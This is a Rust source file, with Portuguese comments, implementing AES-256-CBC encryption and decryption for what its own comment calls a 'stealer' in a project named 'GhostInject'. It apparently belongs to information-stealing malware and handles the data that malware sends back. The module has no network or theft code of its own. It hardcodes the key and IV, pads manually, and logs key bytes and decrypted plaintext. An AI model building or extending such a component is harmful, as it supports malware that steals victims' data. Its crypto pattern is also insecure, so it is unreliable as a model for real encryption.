#![allow(dead_code)]
#![allow(unused_imports)]

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce
};
use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{KeyIvInit, BlockEncryptMut, BlockDecryptMut};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

// Chave: 32 bytes exatos - CERTIFIQUE-SE QUE É IDÊNTICA NO STEALER!
const AES_KEY: &[u8; 32] = b"GhostInject2026!!SuperSecretKey!"; // 32 bytes
const AES_IV: &[u8; 16] = b"GhostInjectIV16!";

pub fn aes_encrypt(data: &[u8]) -> String {
    println!("[CRYPTO] Encrypting {} bytes", data.len());
    
    let cipher = Aes256CbcEnc::new(AES_KEY.into(), AES_IV.into());
    
    let block_size = 16;
    let padding_len = block_size - (data.len() % block_size);
    let mut padded_data = data.to_vec();
    padded_data.extend(vec![padding_len as u8; padding_len]);
    
    let mut buffer = vec![0u8; padded_data.len()];
    match cipher.encrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buffer, padded_data.len()) {
        Ok(_) => {
            let result = BASE64.encode(&buffer);
            println!("[CRYPTO] Encryption successful, output: {} bytes base64", result.len());
            result
        }
        Err(e) => {
            eprintln!("[CRYPTO] Encryption failed: {:?}", e);
            String::new()
        }
    }
}

pub fn aes_decrypt(data: &str) -> Vec<u8> {
    println!("[CRYPTO] Decrypting base64 string of length: {}", data.len());
    
    // Decodifica base64
    let decoded = match BASE64.decode(data) {
        Ok(d) => {
            println!("[CRYPTO] Base64 decode successful, got {} bytes", d.len());
            d
        }
        Err(e) => {
            eprintln!("[CRYPTO] Base64 decode failed: {}", e);
            return Vec::new();
        }
    };
    
    if decoded.is_empty() {
        eprintln!("[CRYPTO] Decoded data is empty");
        return Vec::new();
    }
    
    // Verifica se a chave está correta
    println!("[CRYPTO] Using AES_KEY: {:?}", &AES_KEY[..8]);
    println!("[CRYPTO] Using AES_IV: {:?}", &AES_IV[..8]);
    
    let cipher = Aes256CbcDec::new(AES_KEY.into(), AES_IV.into());
    let mut buffer = vec![0u8; decoded.len()];
    
    match cipher.decrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buffer) {
        Ok(_) => {
            println!("[CRYPTO] Decryption successful, got {} bytes before padding", buffer.len());
            
            // Remove padding (PKCS7)
            if let Some(&last_byte) = buffer.last() {
                let padding_len = last_byte as usize;
                println!("[CRYPTO] Padding length detected: {}", padding_len);
                
                if padding_len <= 16 && padding_len <= buffer.len() {
                    let result = buffer[..buffer.len() - padding_len].to_vec();
                    println!("[CRYPTO] Final data length: {} bytes", result.len());
                    
                    // Mostra preview dos dados decriptados
                    if let Ok(text) = String::from_utf8(result.clone()) {
                        let preview: String = text.chars().take(100).collect();
                        println!("[CRYPTO] Decrypted text preview: {}...", preview);
                    } else {
                        println!("[CRYPTO] Decrypted data is binary (not UTF-8)");
                    }
                    
                    return result;
                }
            }
            
            println!("[CRYPTO] Invalid padding, returning raw buffer");
            buffer
        }
        Err(e) => {
            eprintln!("[CRYPTO] Decryption failed: {:?}", e);
            eprintln!("[CRYPTO] Possible causes:");
            eprintln!("  - Wrong AES_KEY or AES_IV");
            eprintln!("  - Data was encrypted with different key");
            eprintln!("  - Corrupted base64 data");
            Vec::new()
        }
    }
}

// Função para verificar se a criptografia está funcionando (teste)
pub fn test_crypto() {
    let test_text = "Hello, GhostInject! This is a test message.";
    println!("\n[CRYPTO TEST] ==================================");
    println!("[CRYPTO TEST] Original: {}", test_text);
    
    let encrypted = aes_encrypt(test_text.as_bytes());
    println!("[CRYPTO TEST] Encrypted (base64): {}", &encrypted[..50.min(encrypted.len())]);
    
    let decrypted = aes_decrypt(&encrypted);
    let decrypted_text = String::from_utf8_lossy(&decrypted);
    println!("[CRYPTO TEST] Decrypted: {}", decrypted_text);
    println!("[CRYPTO TEST] Success: {}", test_text == decrypted_text);
    println!("[CRYPTO TEST] ==================================\n");
}